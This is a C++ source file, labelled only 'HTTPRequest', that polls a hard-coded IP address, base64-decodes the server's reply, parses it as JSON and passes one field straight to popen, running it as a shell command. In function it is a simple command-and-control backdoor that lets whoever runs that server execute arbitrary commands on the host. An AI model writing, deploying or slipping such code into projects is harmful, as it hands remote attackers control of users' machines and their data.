//
//  HTTPRequest
//

#include <iostream>
#include <fstream>
#include "HTTPRequest.hpp"
#include "Base64/base64.cpp"
#include "json.hpp"

using namespace nlohmann;

std::string execute_command(std::string cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	
	return result;
}

int main() {
        std::string output;
	std::string command_encoded;
	std::string command_decoded;

        http::InternetProtocol protocol = http::InternetProtocol::V4;

        http::Request request("http://3.129.5.34:3000/getuser", protocol);

        const http::Response response = request.send("GET", "", {
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: runscope/0.1",
	    "Cookie: 69"
        });

        if (response.status == http::Response::Ok &&
            !output.empty())
        {
            std::ofstream outfile(output, std::ofstream::binary);
            outfile.write(reinterpret_cast<const char*>(response.body.data()),
                          static_cast<std::streamsize>(response.body.size()));
        }
        else {
		std::cout << std::string(response.body.begin(), response.body.end()) << '\n';
		command_encoded = std::string(response.body.begin(), response.body.end()); 
	}
	
	command_decoded = base64_decode(command_encoded, false);
	std::cout << command_decoded << std:: endl;

	json j = json::parse(command_decoded);
	std::cout << j["1"] << std::endl;

	std::string exec_result = execute_command(j["1"]);
	std::cout << exec_result << std::endl;
}

